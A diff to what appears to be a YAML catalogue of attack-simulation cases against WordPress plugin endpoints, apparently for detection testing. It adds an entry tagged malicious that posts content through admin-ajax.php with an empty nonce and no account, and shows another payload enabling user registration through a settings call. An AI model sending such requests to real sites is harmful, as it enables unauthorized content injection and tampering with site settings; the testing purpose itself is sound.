@@ -77,3 +77,23 @@
       security: ""
     data:
       data: '{"type":"save_setting","append":false,"option":"users_can_register","value":"1"}'
+
+- name: corp-content-write
+  malicious: true
+  stage: complete-mission
+  technique: T1565
+  pattern: CAPEC-242
+  expect: "rbsm_submit_post"
+  correlation: marker
+  request:
+    method: POST
+    path: /wp-admin/admin-ajax.php
+    data:
+      action: "rbsm_submit_post"
+      _nonce: ""
+      formId: "1"
+      title: "Unauthorized"
+      excerpt: "written without an account"
+      content: "written without an account"
+      userName: "Anonymous"
+      userEmail: "anon@example.com"
